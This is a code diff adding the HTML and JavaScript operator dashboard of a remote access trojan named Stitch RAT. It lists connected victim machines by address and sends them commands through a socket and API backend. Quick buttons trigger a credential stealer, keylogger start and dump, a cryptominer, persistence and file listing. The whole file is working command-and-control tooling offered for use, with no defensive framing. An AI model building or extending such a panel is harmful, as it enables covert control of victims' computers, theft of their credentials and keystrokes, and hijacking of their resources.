@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stitch RAT - Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #e0e0e0;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .dashboard {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 20px;
+        }
+        .sidebar, .main {
+            background: rgba(30, 35, 55, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .clients-list {
+            max-height: 500px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+        .client-item {
+            background: rgba(20, 25, 45, 0.9);
+            margin: 8px 0;
+            padding: 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-left: 3px solid #4ecdc4;
+        }
+        .client-item:hover {
+            background: rgba(40, 45, 70, 0.9);
+            transform: translateX(5px);
+        }
+        .client-item.selected {
+            border-left-color: #ff6b6b;
+            background: rgba(50, 55, 80, 0.9);
+        }
+        .client-id { font-weight: bold; color: #4ecdc4; }
+        .client-addr { font-size: 0.8rem; color: #aaa; margin-top: 4px; }
+        .cmd-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .cmd-input-group input {
+            flex: 1;
+            background: #1e2337;
+            border: 1px solid #2a2f4a;
+            color: #e0e0e0;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+        }
+        .cmd-input-group button {
+            background: #4ecdc4;
+            border: none;
+            padding: 0 20px;
+            border-radius: 8px;
+            color: #1a1f3a;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .cmd-input-group button:hover { background: #45b8b0; }
+        .quick-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .quick-btn {
+            background: #2a2f4a;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: #e0e0e0;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        .quick-btn:hover { background: #3a3f60; }
+        .logs {
+            background: #0d0f1a;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            height: 400px;
+            overflow-y: auto;
+        }
+        .log-line {
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1f2a;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .log-time { color: #4ecdc4; margin-right: 10px; }
+        .status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4ecdc4;
+            animation: pulse 1.5s infinite;
+            margin-right: 8px;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.4; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+        .section-title {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #1a1f2a; }
+        ::-webkit-scrollbar-thumb { background: #4ecdc4; border-radius: 3px; }
+    </style>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+<div class="container">
+    <h1>🕹️ Stitch RAT - Command Center</h1>
+    <div class="dashboard">
+        <div class="sidebar">
+            <div class="section-title"><span class="status"></span> Connected Clients</div>
+            <div id="clientsList" class="clients-list"><div style="text-align:center;color:#aaa;">No clients connected</div></div>
+        </div>
+        <div class="main">
+            <div class="command-panel">
+                <div class="section-title">
+                    📡 Command Interface
+                    <span id="selectedDisplay" style="font-size:0.8rem;color:#aaa;">No client selected</span>
+                </div>
+                <div class="cmd-input-group">
+                    <input type="text" id="cmdInput" placeholder="Enter command... (e.g., sysinfo, screenshot, stealer)">
+                    <button id="sendCmd">Send</button>
+                </div>
+                <div class="quick-buttons">
+                    <button class="quick-btn" data-cmd="sysinfo">📊 Sysinfo</button>
+                    <button class="quick-btn" data-cmd="screenshot">📸 Screenshot</button>
+                    <button class="quick-btn" data-cmd="stealer">💀 Run Stealer</button>
+                    <button class="quick-btn" data-cmd="keylog_start">⌨️ Keylog Start</button>
+                    <button class="quick-btn" data-cmd="keylog_dump">📋 Keylog Dump</button>
+                    <button class="quick-btn" data-cmd="miner">⛏️ Start Miner</button>
+                    <button class="quick-btn" data-cmd="miner_stop">⛏️ Stop Miner</button>
+                    <button class="quick-btn" data-cmd="persistence">🔄 Persistence</button>
+                    <button class="quick-btn" data-cmd="ls C:\\">📁 List C:\</button>
+                </div>
+            </div>
+            <div class="section-title">📜 Live Logs</div>
+            <div id="logs" class="logs"><div class="log-line"><span class="log-time">[--:--:--]</span> Waiting for events...</div></div>
+        </div>
+    </div>
+</div>
+<script>
+    let socket = io();
+    let selectedClientId = null;
+    socket.on('connect', () => console.log('WebSocket connected'));
+    socket.on('clients_update', (clients) => {
+        const container = document.getElementById('clientsList');
+        if (!clients.length) {
+            container.innerHTML = '<div style="text-align:center;color:#aaa;">No clients connected</div>';
+            return;
+        }
+        let html = '';
+        clients.forEach(client => {
+            const selectedClass = (selectedClientId === client.id) ? 'selected' : '';
+            html += `<div class="client-item ${selectedClass}" data-id="${client.id}"><div class="client-id">Client #${client.id}</div><div class="client-addr">${client.addr}:${client.port}</div></div>`;
+        });
+        container.innerHTML = html;
+        document.querySelectorAll('.client-item').forEach(el => {
+            el.addEventListener('click', () => selectClient(parseInt(el.dataset.id)));
+        });
+    });
+    socket.on('client_log', (data) => addLog(`[Client ${data.client_id}] ${data.log}`));
+    socket.on('log_history', (history) => {
+        const logsDiv = document.getElementById('logs');
+        logsDiv.innerHTML = '';
+        history.forEach(line => addLog(line, false));
+    });
+    function selectClient(id) {
+        selectedClientId = id;
+        document.getElementById('selectedDisplay').innerHTML = `✅ Client #${id} selected`;
+        document.querySelectorAll('.client-item').forEach(el => {
+            if (parseInt(el.dataset.id) === id) el.classList.add('selected');
+            else el.classList.remove('selected');
+        });
+        fetch('/api/select', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({client_id: id}) });
+    }
+    function sendCommand() {
+        const input = document.getElementById('cmdInput');
+        const cmd = input.value.trim();
+        if (!cmd) return;
+        if (!selectedClientId) { addLog('⚠️ No client selected.'); return; }
+        fetch('/api/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({client_id: selectedClientId, command: cmd}) })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) { addLog(`→ Sent to Client #${selectedClientId}: ${cmd}`); input.value = ''; }
+            else addLog(`❌ Error: ${data.message}`);
+        })
+        .catch(err => addLog(`❌ Request failed: ${err}`));
+    }
+    function addLog(msg, scroll = true) {
+        const logsDiv = document.getElementById('logs');
+        const time = new Date().toLocaleTimeString();
+        const logLine = document.createElement('div');
+        logLine.className = 'log-line';
+        logLine.innerHTML = `<span class="log-time">[${time}]</span> ${escapeHtml(msg)}`;
+        logsDiv.appendChild(logLine);
+        if (scroll) logsDiv.scrollTop = logsDiv.scrollHeight;
+        while (logsDiv.children.length > 500) logsDiv.removeChild(logsDiv.firstChild);
+    }
+    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+    document.getElementById('sendCmd').addEventListener('click', sendCommand);
+    document.getElementById('cmdInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendCommand(); });
+    document.querySelectorAll('.quick-btn').forEach(btn => {
+        btn.addEventListener('click', () => { document.getElementById('cmdInput').value = btn.dataset.cmd; sendCommand(); });
+    });
+</script>
+</body>
+</html>
